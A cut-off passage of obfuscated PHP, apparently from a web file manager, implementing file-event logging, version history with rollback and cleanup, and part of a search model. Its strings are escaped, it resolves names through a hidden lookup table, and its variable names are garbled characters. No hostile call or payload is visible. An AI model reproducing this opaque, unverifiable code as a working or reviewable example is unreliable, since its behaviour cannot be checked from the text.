"\x69\157\137\163\157\x75\x72\x63\145\137\145\x76\145\156\164"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\x54\151\155\145", "\164\x69\155\x65", "\151\x6e\x73\145\x72\x74", "\146\165\156\143\164\x69\x6f\156"), array("\144\x65\x73\x63", '', "\151\156\x73\x65\x72\164\54\x75\160\144\x61\164\x65\54\163\145\x6c\x65\x63\x74", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($·ŸãÒ˜§, $é×şâ±Ş, $ ¿ÆôŸ¥ = '') { $ÅÊ ——æ =& $_SERVER[ÕŸ²ó÷å]; if (!$this->eventSave) { return; } $İ¿Ÿ¥Íí = Model($ÅÊ ——æ[1421])->sourceInfo($·ŸãÒ˜§); if (!$İ¿Ÿ¥Íí) { return !1; } if ($this->isDisableEvent($İ¿Ÿ¥Íí, $é×şâ±Ş)) { return; } if ($ ¿ÆôŸ¥ && is_string($ ¿ÆôŸ¥)) { $ ¿ÆôŸ¥ = array($ÅÊ ——æ[2011] => $ ¿ÆôŸ¥); } $óºØˆ°  = defined($ÅÊ ——æ[2198]) ? USER_ID : 0; $´…Š×ù® = array($ÅÊ ——æ[500] => $·ŸãÒ˜§, $ÅÊ ——æ[2199] => $İ¿Ÿ¥Íí[$ÅÊ ——æ[202]], $ÅÊ ——æ[2200] => $İ¿Ÿ¥Íí[$ÅÊ ——æ[32]], $ÅÊ ——æ[591] => !empty($İ¿Ÿ¥Íí[$ÅÊ ——æ[591]]) ? $İ¿Ÿ¥Íí[$ÅÊ ——æ[591]] : $ÅÊ ——æ[12], $ÅÊ ——æ[1764] => $óºØˆ° , $ÅÊ ——æ[505] => $é×şâ±Ş, $ÅÊ ——æ[1766] => $ ¿ÆôŸ¥); $this->addSystemLog($é×şâ±Ş, $´…Š×ù®); unset($´…Š×ù®[$ÅÊ ——æ[2200]], $´…Š×ù®[$ÅÊ ——æ[591]]); return $this->add($´…Š×ù®); } private function addSystemLog($¬áó‚ÚÕ, $ğ€ß–ö°) { $¶¾±ˆëœ =& $_SERVER[ÕŸ²ó÷å]; if ($¬áó‚ÚÕ == $¶¾±ˆëœ[2201]) { $¬áó‚ÚÕ = $ğ€ß–ö°[$¶¾±ˆëœ[535]][$¶¾±ˆëœ[2202]]; } else { if (in_array($¬áó‚ÚÕ, array($¶¾±ˆëœ[1951], $¶¾±ˆëœ[2203]))) { $¬áó‚ÚÕ = $ğ€ß–ö°[$¶¾±ˆëœ[535]][$¶¾±ˆëœ[181]]; } } $Àø–à‹ê = array_merge($ğ€ß–ö°, array($¶¾±ˆëœ[2204] => $ğ€ß–ö°[$¶¾±ˆëœ[203]], $¶¾±ˆëœ[2205] => $ğ€ß–ö°[$¶¾±ˆëœ[2205]])); Hook::trigger($¶¾±ˆëœ[2206], $¶¾±ˆëœ[2207] . $¬áó‚ÚÕ, $ğ€ß–ö°); Model($¶¾±ˆëœ[1915])->addLog($¶¾±ˆëœ[2207] . $¬áó‚ÚÕ, $Àø–à‹ê); } private function isDisableEvent($Š¡–„Èä, $…˜¸«­) { $Ô×›Şñƒ =& $_SERVER[ÕŸ²ó÷å]; if ($Š¡–„Èä[$Ô×›Şñƒ[200]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($…˜¸«­ == $Ô×›Şñƒ[1940]) { return !1; } return !0; } public function eventCreate($ò»±ŒÛÚ, $ÒÒİ”ë‹) { $…Ÿœ¿‹£ =& $_SERVER[ÕŸ²ó÷å]; $âñÜš† = Model($…Ÿœ¿‹£[1421])->sourceInfo($ò»±ŒÛÚ); $æ©½·«Ñ = array($…Ÿœ¿‹£[2202] => $ÒÒİ”ë‹, $…Ÿœ¿‹£[32] => $âñÜš†[$…Ÿœ¿‹£[32]]); return $this->addEvent($ò»±ŒÛÚ, $…Ÿœ¿‹£[2201], $æ©½·«Ñ); } public function eventFileEdit($¦®ùêêô) { $ÌÊÎÃêŞ =& $_SERVER[ÕŸ²ó÷å]; $Ñ¥¥‰âÌ = array($ÌÊÎÃêŞ[2208] => $_SERVER[$ÌÊÎÃêŞ[2209]], $ÌÊÎÃêŞ[2210] => strtolower(ACTION)); if (isset($GLOBALS[$ÌÊÎÃêŞ[7]][$ÌÊÎÃêŞ[2211]])) { $Ñ¥¥‰âÌ[$ÌÊÎÃêŞ[2211]] = $ÌÊÎÃêŞ[101]; } return $this->addEvent($¦®ùêêô, $ÌÊÎÃêŞ[1941], $Ñ¥¥‰âÌ); } public function eventRecycle($×°â£Â, $‹½úóÌê) { return $this->addEvent($×°â£Â, $_SERVER[ÕŸ²ó÷å][2203], $‹½úóÌê); } private static $_removeLast = ''; public function eventRemove($Ìƒ­Úâû) { $´Ó‚§öš =& $_SERVER[ÕŸ²ó÷å]; self::$_removeLast = $Ìƒ­Úâû; $¡ÂŞ”ıÆ = Model($´Ó‚§öš[1421])->sourceInfo($Ìƒ­Úâû); $×Í¾•Ÿ = array_field_key($¡ÂŞ”ıÆ, array($´Ó‚§öš[203], $´Ó‚§öš[550], $´Ó‚§öš[514], $´Ó‚§öš[593])); $€„ûØŠÍ = array($´Ó‚§öš[181] => $¡ÂŞ”ıÆ[$´Ó‚§öš[32]], $´Ó‚§öš[2210] => ACTION, $´Ó‚§öš[2212] => $×Í¾•Ÿ); return $this->addEvent($¡ÂŞ”ıÆ[$´Ó‚§öš[202]], $´Ó‚§öš[1940], $€„ûØŠÍ); } public function eventShare($­º×Ë”‹, $‚¡ë§‡™) { return $this->addEvent($­º×Ë”‹, $_SERVER[ÕŸ²ó÷å][1951], $‚¡ë§‡™); } public function eventMove($°ññ¥Ù, $ŒÚ§²„Ú, $÷éÏ Â²) { $–èÆŠôÄ =& $_SERVER[ÕŸ²ó÷å]; if (self::$_removeLast == $°ññ¥Ù) { return; } $îƒå¢Í = Model($–èÆŠôÄ[1421]); $Ğ¥¹Â = $îƒå¢Í->sourceInfo($°ññ¥Ù); $ê„‚ğø¥ = $îƒå¢Í->sourceInfo($ŒÚ§²„Ú); $Ğü©¡ŠË = $îƒå¢Í->sourceInfo($÷éÏ Â²); $‡µó×éƒ = array($–èÆŠôÄ[1244] => $ŒÚ§²„Ú, $–èÆŠôÄ[2213] => $ê„‚ğø¥[$–èÆŠôÄ[32]], $–èÆŠôÄ[2189] => !empty($ê„‚ğø¥[$–èÆŠôÄ[591]]) ? $ê„‚ğø¥[$–èÆŠôÄ[591]] : $–èÆŠôÄ[12], $–èÆŠôÄ[1245] => $÷éÏ Â², $–èÆŠôÄ[2214] => $Ğü©¡ŠË[$–èÆŠôÄ[32]], $–èÆŠôÄ[2215] => !empty($Ğü©¡ŠË[$–èÆŠôÄ[591]]) ? $Ğü©¡ŠË[$–èÆŠôÄ[591]] : $–èÆŠôÄ[12]); $this->addEvent($°ññ¥Ù, $–èÆŠôÄ[629], $‡µó×éƒ); $Ğ¥¹Â = $îƒå¢Í->sourceInfo($°ññ¥Ù); $‡µó×éƒ = array($–èÆŠôÄ[203] => $Ğ¥¹Â[$–èÆŠôÄ[203]], $–èÆŠôÄ[32] => $Ğ¥¹Â[$–èÆŠôÄ[32]]); $this->addEvent($ŒÚ§²„Ú, $–èÆŠôÄ[2216], $‡µó×éƒ); } public function eventCopy($ı´ºŠ£ü) { $this->eventCreate($ı´ºŠ£ü, $_SERVER[ÕŸ²ó÷å][627]); } public function eventRename($€˜¸ÃèÎ, $ŠûÎÎ¾‹, $ï‚¿Äí¾) { $©ûßÒ©Ù =& $_SERVER[ÕŸ²ó÷å]; $ª¨÷£Ù« = array($©ûßÒ©Ù[1244] => $ŠûÎÎ¾‹, $©ûßÒ©Ù[1245] => $ï‚¿Äí¾); return $this->addEvent($€˜¸ÃèÎ, $©ûßÒ©Ù[1435], $ª¨÷£Ù«); } public function eventAddComment($êè°µù, $¥·©õŸ) { return $this->addEvent($êè°µù, $_SERVER[ÕŸ²ó÷å][2217], $¥·©õŸ); } public function eventAddDesc($ê¦ÆéÄœ, $®‚Ğ§Œ…) { return $this->addEvent($ê¦ÆéÄœ, $_SERVER[ÕŸ²ó÷å][2218], $®‚Ğ§Œ…); } public function listBySource($Ãñ§àì) { $€§ß¾À =& $_SERVER[ÕŸ²ó÷å]; $ İ®áïĞ = Model($€§ß¾À[1421])->sourceInfo($Ãñ§àì); $ª‰š—çñ = array($€§ß¾À[500] => $Ãñ§àì); if ($ İ®áïĞ[$€§ß¾À[494]] == $€§ß¾À[101]) { $è®ÑÈû½ = Model($€§ß¾À[1421])->listSearchChildren($Ãñ§àì, 20000); $è®ÑÈû½[] = $Ãñ§àì . $€§ß¾À[463]; $ª‰š—çñ = array($€§ß¾À[203] => array($€§ß¾À[7], $è®ÑÈû½)); } $º†Á—Ÿõ = $this->where($ª‰š—çñ)->order($€§ß¾À[2219])->selectPage(); if ($º†Á—Ÿõ[$€§ß¾À[451]][$€§ß¾À[452]] == 0) { $º†Á—Ÿõ[$€§ß¾À[451]][$€§ß¾À[452]] = 1; $º†Á—Ÿõ[$€§ß¾À[454]] = array(array($€§ß¾À[500] => $Ãñ§àì, $€§ß¾À[2199] => $ İ®áïĞ[$€§ß¾À[202]], $€§ß¾À[1764] => $ İ®áïĞ[$€§ß¾À[536]], $€§ß¾À[505] => $€§ß¾À[2220], $€§ß¾À[506] => $ İ®áïĞ[$€§ß¾À[241]], $€§ß¾À[1766] => $€§ß¾À[12])); } return $this->eventListParse($º†Á—Ÿõ, $Ãñ§àì); } private function eventListParse($µûøÎ‚ç, $ÑÄµÌ¶–) { $°Õ¹×ıƒ =& $_SERVER[ÕŸ²ó÷å]; $¬âÛÉÆÍ = $µûøÎ‚ç[$°Õ¹×ıƒ[454]]; $à©¬» = array_to_keyvalue($¬âÛÉÆÍ, $°Õ¹×ıƒ[12], $°Õ¹×ıƒ[203]); $õ–óï = array_to_keyvalue($¬âÛÉÆÍ, $°Õ¹×ıƒ[12], $°Õ¹×ıƒ[2205]); foreach ($¬âÛÉÆÍ as $®ÀÛÉı¶) { $òĞ×ñ‡ = $®ÀÛÉı¶[$°Õ¹×ıƒ[535]]; if ($®ÀÛÉı¶[$°Õ¹×ıƒ[33]] == $°Õ¹×ıƒ[629] && isset($òĞ×ñ‡[$°Õ¹×ıƒ[1244]])) { $à©¬»[] = $òĞ×ñ‡[$°Õ¹×ıƒ[1244]] . $°Õ¹×ıƒ[12]; $à©¬»[] = $òĞ×ñ‡[$°Õ¹×ıƒ[1245]] . $°Õ¹×ıƒ[12]; } if ($®ÀÛÉı¶[$°Õ¹×ıƒ[33]] == $°Õ¹×ıƒ[2216] && isset($òĞ×ñ‡[$°Õ¹×ıƒ[203]])) { $à©¬»[] = $òĞ×ñ‡[$°Õ¹×ıƒ[203]] . $°Õ¹×ıƒ[12]; } } $à©¬» = array_merge($à©¬», $õ–óï, array($ÑÄµÌ¶– . $°Õ¹×ıƒ[12])); $à©¬» = array_unique($à©¬»); $êÜªÕ“Ü = array_unique(array_to_keyvalue($¬âÛÉÆÍ, $°Õ¹×ıƒ[12], $°Õ¹×ıƒ[1773])); $µúø÷š = Model($°Õ¹×ıƒ[607])->userListInfo($êÜªÕ“Ü); $Öâ»éš÷ = Model($°Õ¹×ıƒ[908])->sourceListInfo($à©¬», !0); foreach ($¬âÛÉÆÍ as &$®ÀÛÉı¶) { if ($®ÀÛÉı¶[$°Õ¹×ıƒ[33]] == $°Õ¹×ıƒ[629] && isset($®ÀÛÉı¶[$°Õ¹×ıƒ[535]][$°Õ¹×ıƒ[1244]])) { $®ÀÛÉı¶[$°Õ¹×ıƒ[535]][$°Õ¹×ıƒ[1244]] = $Öâ»éš÷[$®ÀÛÉı¶[$°Õ¹×ıƒ[535]][$°Õ¹×ıƒ[1244]]]; $®ÀÛÉı¶[$°Õ¹×ıƒ[535]][$°Õ¹×ıƒ[1245]] = $Öâ»éš÷[$®ÀÛÉı¶[$°Õ¹×ıƒ[535]][$°Õ¹×ıƒ[1245]]]; } if ($®ÀÛÉı¶[$°Õ¹×ıƒ[33]] == $°Õ¹×ıƒ[2216] && isset($®ÀÛÉı¶[$°Õ¹×ıƒ[535]][$°Õ¹×ıƒ[203]])) { $®ÀÛÉı¶[$°Õ¹×ıƒ[535]][$°Õ¹×ıƒ[203]] = $Öâ»éš÷[$®ÀÛÉı¶[$°Õ¹×ıƒ[535]][$°Õ¹×ıƒ[203]]]; } $®ÀÛÉı¶[$°Õ¹×ıƒ[100]] = $Öâ»éš÷[$®ÀÛÉı¶[$°Õ¹×ıƒ[203]]]; $®ÀÛÉı¶[$°Õ¹×ıƒ[2221]] = $Öâ»éš÷[$®ÀÛÉı¶[$°Õ¹×ıƒ[2205]]]; if ($®ÀÛÉı¶[$°Õ¹×ıƒ[33]] == $°Õ¹×ıƒ[1940]) { $®ÀÛÉı¶[$°Õ¹×ıƒ[2221]] = $®ÀÛÉı¶[$°Õ¹×ıƒ[100]]; $®ÀÛÉı¶[$°Õ¹×ıƒ[2205]] = $®ÀÛÉı¶[$°Õ¹×ıƒ[2221]][$°Õ¹×ıƒ[203]]; $®ÀÛÉı¶[$°Õ¹×ıƒ[100]] = !1; $®ÀÛÉı¶[$°Õ¹×ıƒ[203]] = $°Õ¹×ıƒ[12]; } $®ÀÛÉı¶[$°Õ¹×ıƒ[2148]] = $µúø÷š[$®ÀÛÉı¶[$°Õ¹×ıƒ[1773]]]; } unset($®ÀÛÉı¶); $µûøÎ‚ç[$°Õ¹×ıƒ[454]] = $¬âÛÉÆÍ; return $µûøÎ‚ç; } public function removeBySource($¸¢Ëáé) { $œİìö‡Í = array($_SERVER[ÕŸ²ó÷å][500] => $¸¢Ëáé); $this->where($œİìö‡Í)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\x72\x63\x65\x5f\x68\x69\x73\x74\x6f\x72\x79"; public function historyCount($çœúŞü) { $„ÒÈø€ =& $_SERVER[ÕŸ²ó÷å]; if (!$çœúŞü) { return array(); } if (is_string($çœúŞü) || is_int($çœúŞü)) { $çœúŞü = array($çœúŞü); } $äŞŒ’ßú = array($„ÒÈø€[203], $„ÒÈø€[2005] => $„ÒÈø€[574]); $ŠíŸ†¶Ó = array($„ÒÈø€[203] => array($„ÒÈø€[7], $çœúŞü)); $©óıâ¹Ã = $this->field($äŞŒ’ßú)->where($ŠíŸ†¶Ó)->group($„ÒÈø€[203])->select(); return array_to_keyvalue($©óıâ¹Ã, $„ÒÈø€[203], $„ÒÈø€[574]); } public function addHistory($”ˆ«Ï£ù, $Œ°Ã¦ôÉ = '') { $˜âˆıÔ™ =& $_SERVER[ÕŸ²ó÷å]; $ º¹ğïÉ = array($˜âˆıÔ™[500] => $”ˆ«Ï£ù[$˜âˆıÔ™[203]], $˜âˆıÔ™[1764] => isset($”ˆ«Ï£ù[$˜âˆıÔ™[538]]) ? $”ˆ«Ï£ù[$˜âˆıÔ™[538]] : $”ˆ«Ï£ù[$˜âˆıÔ™[536]], $˜âˆıÔ™[551] => $”ˆ«Ï£ù[$˜âˆıÔ™[550]], $˜âˆıÔ™[626] => $”ˆ«Ï£ù[$˜âˆıÔ™[89]], $˜âˆıÔ™[2222] => $Œ°Ã¦ôÉ); if ($GLOBALS[$˜âˆıÔ™[6]][$˜âˆıÔ™[102]][$˜âˆıÔ™[1305]] >= 1) { $this->historyAutoClear($ º¹ğïÉ[$˜âˆıÔ™[203]]); $this->add($ º¹ğïÉ); } Hook::trigger($˜âˆıÔ™[2223], $ º¹ğïÉ); Model($˜âˆıÔ™[2224])->eventFileEdit($”ˆ«Ï£ù[$˜âˆıÔ™[203]]); } private function historyAutoClear($§úò¡ü) { $äÉíö =& $_SERVER[ÕŸ²ó÷å]; $’ÈÓë¼± = Model($äÉíö[854])->get($äÉíö[1327]); $¬´ÈÎ›÷ = intval($GLOBALS[$äÉíö[6]][$äÉíö[102]][$äÉíö[1305]]); $ì‚‡¸ŞÌ = $’ÈÓë¼± == $äÉíö[1328] ? min(5, $¬´ÈÎ›÷) : $¬´ÈÎ›÷; $ì‚‡¸ŞÌ = $ì‚‡¸ŞÌ <= 0 ? 0 : $ì‚‡¸ŞÌ - 1; if ($ì‚‡¸ŞÌ >= 499) { return; } $ÈÄ› ‡Û = array($äÉíö[500] => $§úò¡ü); $í”„ì ” = $this->field($äÉíö[2225])->where($ÈÄ› ‡Û)->order($äÉíö[2219])->select(); if (!$í”„ì ” || $ì‚‡¸ŞÌ >= count($í”„ì ”)) { return; } $ä¯î¤¹ = array_to_keyvalue($í”„ì ”, $äÉíö[12], $äÉíö[484]); $ä¯î¤¹ = array_slice($ä¯î¤¹, $ì‚‡¸ŞÌ); $Æ·Î–Ì = array_to_keyvalue($í”„ì ”, $äÉíö[12], $äÉíö[550]); $Æ·Î–Ì = array_slice($Æ·Î–Ì, $ì‚‡¸ŞÌ); if (!$ä¯î¤¹ || !$Æ·Î–Ì) { return; } $ÈÄ› ‡Û = array($äÉíö[502] => array($äÉíö[7], $ä¯î¤¹)); $this->where($ÈÄ› ‡Û)->delete(); Model($äÉíö[553])->remove($Æ·Î–Ì); } public function listData($ÙŞïïãö) { $ÅË²çğæ =& $_SERVER[ÕŸ²ó÷å]; $É™Îï®ù = array($ÅË²çğæ[500] => $ÙŞïïãö); $…¼¼­ÃÎ = $ÅË²çğæ[2226]; $ŒÓè˜‡¶ = $this->field($…¼¼­ÃÎ)->where($É™Îï®ù)->order($ÅË²çğæ[2219])->selectPage(); $this->_listAppendUser($ŒÓè˜‡¶[$ÅË²çğæ[454]]); $Ç³ğéØ = Model($ÅË²çğæ[854])->get($ÅË²çğæ[1327]); $ÇÜÎÁÏÚ = 5; if ($Ç³ğéØ == $ÅË²çğæ[1328]) { $ŒÓè˜‡¶[$ÅË²çğæ[454]] = array_slice($ŒÓè˜‡¶[$ÅË²çğæ[454]], 0, $ÇÜÎÁÏÚ); $ŒÓè˜‡¶[$ÅË²çğæ[451]] = array($ÅË²çğæ[2227] => 1, $ÅË²çğæ[2228] => 20, $ÅË²çğæ[2229] => 1, $ÅË²çğæ[2230] => count($ŒÓè˜‡¶[$ÅË²çğæ[454]])); } return $ŒÓè˜‡¶; } protected function _listAppendUser(&$ñ¸ÌÃ™Ç) { $²Â¦˜æÍ =& $_SERVER[ÕŸ²ó÷å]; $»ªÙ™Àæ = array_to_keyvalue($ñ¸ÌÃ™Ç, $²Â¦˜æÍ[12], $²Â¦˜æÍ[1773]); $„ÆÆù÷ = Model($²Â¦˜æÍ[607])->userListInfo($»ªÙ™Àæ); foreach ($ñ¸ÌÃ™Ç as &$›ó´Øùú) { $ä¢ı¿àø = $›ó´Øùú[$²Â¦˜æÍ[1773]]; $›ó´Øùú[$²Â¦˜æÍ[536]] = $„ÆÆù÷[$ä¢ı¿àø] ? $„ÆÆù÷[$ä¢ı¿àø] : !1; } unset($›ó´Øùú); } public function fileInfo($Œø¹·¢à) { $Şõ©‰¤Ñ =& $_SERVER[ÕŸ²ó÷å]; $ô§è“ë¹ = $this->tablePrefix; $®–éà‚ = "{$ô§è“ë¹}\151\157\137\146\151\154\145\x20\x66\151\x6c\x65\x73\40\157\156\40\x66\x69\154\x65\x73\56\146\x69\154\145\111\104\40\x3d\x20\x68\151\163\164\157\x72\171\56\146\151\154\x65\x49\104"; return $this->alias($Şõ©‰¤Ñ[2231])->where(array($Şõ©‰¤Ñ[502] => $Œø¹·¢à))->join($®–éà‚, $Şõ©‰¤Ñ[2232])->find(); } public function removeItem($á˜›¥ú˜) { $×ßõšå¨ =& $_SERVER[ÕŸ²ó÷å]; $‚™É„éĞ = array($×ßõšå¨[502] => $á˜›¥ú˜); $ÚÇâ¥ğ° = $this->where($‚™É„éĞ)->find(); if ($ÚÇâ¥ğ°) { $°Ò”¤Ë = $this->where($‚™É„éĞ)->delete(); Model($×ßõšå¨[553])->remove($ÚÇâ¥ğ°[$×ßõšå¨[550]]); return $°Ò”¤Ë; } return !1; } public function removeBySource($í„È¶°Ñ) { $¡Ÿ‡ÊÍÁ =& $_SERVER[ÕŸ²ó÷å]; if (!$í„È¶°Ñ) { return !1; } if (!is_array($í„È¶°Ñ)) { $í„È¶°Ñ = array($í„È¶°Ñ); } $Å¶Ò ÌÅ = array($¡Ÿ‡ÊÍÁ[500] => array($¡Ÿ‡ÊÍÁ[7], $í„È¶°Ñ)); $ê•½ºŒ = $this->field($¡Ÿ‡ÊÍÁ[551])->where($Å¶Ò ÌÅ)->select(); if ($ê•½ºŒ) { $this->where($Å¶Ò ÌÅ)->delete(); $œ¯ùÜÁò = array_to_keyvalue($ê•½ºŒ, $¡Ÿ‡ÊÍÁ[12], $¡Ÿ‡ÊÍÁ[550]); Model($¡Ÿ‡ÊÍÁ[553])->remove($œ¯ùÜÁò); } return !0; } public function setDetail($åÈñş®ß, $ƒÙ‚Â¼ƒ) { $Ô´ñ»™„ =& $_SERVER[ÕŸ²ó÷å]; return $this->where(array($Ô´ñ»™„[502] => $åÈñş®ß))->save(array($Ô´ñ»™„[2222] => $ƒÙ‚Â¼ƒ)); } public function rollbackToItem($Ñ—‘×¢é, $¬À²ú¿‹) { $€î˜ııõ =& $_SERVER[ÕŸ²ó÷å]; $öé€Õ½ = Model($€î˜ııõ[908])->sourceInfo($Ñ—‘×¢é); $this->addHistory($öé€Õ½, LNG($€î˜ııõ[2233])); $İîãúôŞ = $this->find($¬À²ú¿‹); $Áó‡ñùî = array($€î˜ııõ[550] => $İîãúôŞ[$€î˜ııõ[550]], $€î˜ııõ[89] => $İîãúôŞ[$€î˜ııõ[89]], $€î˜ııõ[98] => time(), $€î˜ııõ[538] => USER_ID); Model($€î˜ııõ[908])->where(array($€î˜ııõ[203] => $Ñ—‘×¢é))->save($Áó‡ñùî); return $this->where(array($€î˜ııõ[502] => $¬À²ú¿‹))->delete(); } public function clearSame($Ñ«ºŸËı) { $½ÃŸ¾öÚ =& $_SERVER[ÕŸ²ó÷å]; $ıÚ–Ôá‘ = $this->listData($Ñ«ºŸËı); $İÎÊéß· = array_to_keyvalue_group($ıÚ–Ôá‘, $½ÃŸ¾öÚ[550]); $¹ÁÉ¶‘Š = array(); $Ã©ß¯µß = array(); foreach ($İÎÊéß· as $ÈÑƒËÛ) { if (!$ÈÑƒËÛ || count($ÈÑƒËÛ) <= 1) { continue; } foreach ($ÈÑƒËÛ as $Ã¢ì ù²) { $¹ÁÉ¶‘Š[] = $Ã¢ì ù²[$½ÃŸ¾öÚ[550]]; $Ã©ß¯µß[] = $Ã¢ì ù²[$½ÃŸ¾öÚ[484]]; } } if (!$Ã©ß¯µß) { return; } $this->where(array($½ÃŸ¾öÚ[484] => array($½ÃŸ¾öÚ[7], $Ã©ß¯µß)))->delete(); Model($½ÃŸ¾öÚ[553])->remove($¹ÁÉ¶‘Š); } public function userSpace() { $ÀË¤˜§û =& $_SERVER[ÕŸ²ó÷å]; $“€–ğ¨‘ = $this->tablePrefix; $Ÿ¤×ä…© = array($ÀË¤˜§û[1764] => USER_ID); $ï»Ç×¸¨ = "{$“€–ğ¨‘}\151\x6f\137\x66\151\x6c\x65\40\x66\151\x6c\x65\x73\40\x6f\x6e\x20\146\x69\154\145\x73\56\x66\x69\x6c\x65\x49\104\40\75\x20\150\151\x73\x74\x6f\x72\171\56\x66\151\x6c\145\111\x44"; return $this->alias($ÀË¤˜§û[2231])->where($Ÿ¤×ä…©)->join($ï»Ç×¸¨, $ÀË¤˜§û[2232])->sum($ÀË¤˜§û[89]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($œ¦‰õ³Ğ) { $£¶Èğ€µ =& $_SERVER[ÕŸ²ó÷å]; $êıİµ´ = KodIO::fileTypeList(); $ìîàé¬½ = $êıİµ´[$œ¦‰õ³Ğ]; if (!$ìîàé¬½) { return array(); } $¹½”àØŠ = $ìîàé¬½[$£¶Èğ€µ[179]]; $«¸ÌÚ” = $£¶Èğ€µ[7]; if (!$ìîàé¬½[$£¶Èğ€µ[179]]) { $áˆœ²± = array_to_keyvalue($êıİµ´, $£¶Èğ€µ[12], $£¶Èğ€µ[179]); $¹½”àØŠ = implode($£¶Èğ€µ[50], $áˆœ²±); $«¸ÌÚ” = $£¶Èğ€µ[2234]; } $Ÿ—ê§¤Ú = explode($£¶Èğ€µ[50], trim($¹½”àØŠ, $£¶Èğ€µ[50])); return array($«¸ÌÚ”, $Ÿ—ê§¤Ú); } public function listPathType($¹ì˜Éìˆ) { $£‘½İˆ‚ =& $_SERVER[ÕŸ²ó÷å]; $ÅÁµ…¦² = $this->fileTypeWhere($¹ì˜Éìˆ); if (!$ÅÁµ…¦²) { return array(); } $ï¿şïÒü = USER_ID; $›–°«…à = Model($£‘½İˆ‚[607])->getInfo($ï¿şïÒü); $§§­êšó = array($£‘½İˆ‚[657] => SourceModel::TYPE_USER, $£‘½İˆ‚[593] => array($£‘½İˆ‚[621], $£‘½İˆ‚[603] . $›–°«…à[$£‘½İˆ‚[100]][$£‘½İˆ‚[203]] . $£‘½İˆ‚[622]), $£‘½İˆ‚[658] => $ï¿şïÒü, $£‘½İˆ‚[655] => 0, $£‘½İˆ‚[656] => $ÅÁµ…¦²); return $this->listSource($§§­êšó); } public function listSearch($æşøø–ç, $˜×±™Ôã = 300) { $“—Ûº’ =& $_SERVER[ÕŸ²ó÷å]; if (isset($æşøø–ç[$“—Ûº’[2070]]) && $æşøø–ç[$“—Ûº’[2070]]) { $æşøø–ç[$“—Ûº’[2070]] = str_replace($“—Ûº’[469], $“—Ûº’[2235], trim($æşøø–ç[$“—Ûº’[2070]])); } $èıêïâ = $this->_parseSearchWhere($æşøø–ç); if (!isset($èıêïâ[$“—Ûº’[514]])) { $èıêïâ[$“—Ûº’[514]] = 0; } $£ÌÃÇ™› = $“—Ûº’[2236]; $ÌÑçœŸù = $èıêïâ; $Ê¥¬çÔç = $£ÌÃÇ™›; $this->_listSearchBindPinyin($æşøø–ç, $èıêïâ, $£ÌÃÇ™›); $this->alias($“—Ûº’[528])->_makeOrder(); $èıêïâ = $this->parseWhereLike($èıêïâ); $‹µ¾ Ğš = $this->distinct(!0)->field($£ÌÃÇ™›)->where($èıêïâ)->selectPage($˜×±™Ôã); if ($GLOBALS[$“—Ûº’[6]][$“—Ûº’[466]][$“—Ûº’[467]] && Input::check($æşøø–ç[$“—Ûº’[2070]], $“—Ûº’[664]) && $‹µ¾ Ğš[$“—Ûº’[451]][$“—Ûº’[438]] == 1 && $‹µ¾ Ğš[$“—Ûº’[451]][$“—Ûº’[452]] == 0) { $‹µ¾ Ğš = $this->distinct(!0)->field($£ÌÃÇ™›)->where($ÌÑçœŸù)->limit(1000)->select(); $‹µ¾ Ğš = array_page_split($‹µ¾ Ğš, !1, $˜×±™Ôã); } $this->_listSearchFileContent($‹µ¾ Ğš, $æşøø–ç, $Ê¥¬çÔç, $ÌÑçœŸù); $this->_listSearchDesc($‹µ¾ Ğš, $æşøø–ç, $Ê¥¬çÔç); $this->_listSearchTag($‹µ¾ Ğš, $æşøø–ç, $Ê¥¬çÔç); $this->_listSearchGroupTag($‹µ¾ Ğš, $æşøø–ç, $Ê¥¬çÔç); $this->_listDataApply($‹µ¾ Ğš[$“—Ûº’[454]]); $this->_listMake($‹µ¾ Ğš); return $‹µ¾ Ğš; } private function _listSearchFileContent(&$§™¼›‚, $šû†”Áç, $™™á‘ËÏ, $Ç˜×œ) { $»Øñâ¿Ù =& $_SERVER[ÕŸ²ó÷å]; if (!$šû†”Áç[$»Øñâ¿Ù[2070]] || $§™¼›‚[$»Øñâ¿Ù[451]][$»Øñâ¿Ù[438]] > 1) { return; } if (!isset($Ç˜×œ[$»Øñâ¿Ù[32]]) || !is_array($šû†”Áç[$»Øñâ¿Ù[550]])) { return; } $Ç˜×œ[$»Øñâ¿Ù[550]] = array($»Øñâ¿Ù[7], $šû†”Áç[$»Øñâ¿Ù[550]]); unset($Ç˜×œ[$»Øñâ¿Ù[32]]); unset($šû†”Áç[$»Øñâ¿Ù[550]]); $Š·îğ€¢ = $this->field($™™á‘ËÏ)->where($Ç˜×œ)->limit($»Øñâ¿Ù[2237])->select(); if (!$Š·îğ€¢ || count($Š·îğ€¢) == 0) { return; } $§™¼›‚[$»Øñâ¿Ù[454]] = array_merge($Š·îğ€¢, $§™¼›‚[$»Øñâ¿Ù[454]]); $§™¼›‚[$»Øñâ¿Ù[451]][$»Øñâ¿Ù[452]] += count($Š·îğ€¢); } private function _listSearchTag(&$“ºâà, $í÷òí¬€, $»Õ¦’á¿) { $·“ú¢”° =& $_SERVER[ÕŸ²ó÷å]; if (!$í÷òí¬€[$·“ú¢”°[2070]] || $“ºâà[$·“ú¢”°[451]][$·“ú¢”°[438]] > 1) { return; } $ÀÙúÒô = Model($·“ú¢”°[2238])->listData(); $üÙÖ†œÇ = array(); $õ‘üıÚ = $í÷òí¬€[$·“ú¢”°[2070]]; foreach ($ÀÙúÒô as $âÆ«—Å) { $üùŒ€œğ = $âÆ«—Å[$·“ú¢”°[32]]; $£íµŸ÷ = str_replace($·“ú¢”°[53], $·“ú¢”°[12], Pinyin::get($üùŒ€œğ)); if (stripos($üùŒ€œğ, $õ‘üıÚ) !== !1 || stripos($£íµŸ÷, $õ‘üıÚ) !== !1) { $üÙÖ†œÇ[] = $âÆ«—Å[$·“ú¢”°[484]]; } } if (!$üÙÖ†œÇ) { return; } $‘¬ı©Í› = array($·“ú¢”°[509] => array($·“ú¢”°[7], $üÙÖ†œÇ), $·“ú¢”°[1773] => USER_ID); $‡•Â¿ı¨ = Model($·“ú¢”°[511])->field($·“ú¢”°[97])->where($‘¬ı©Í›)->select(); $‡•Â¿ı¨ = array_to_keyvalue($‡•Â¿ı¨, $·“ú¢”°[12], $·“ú¢”°[97]); $£ÌÔÎŞ = 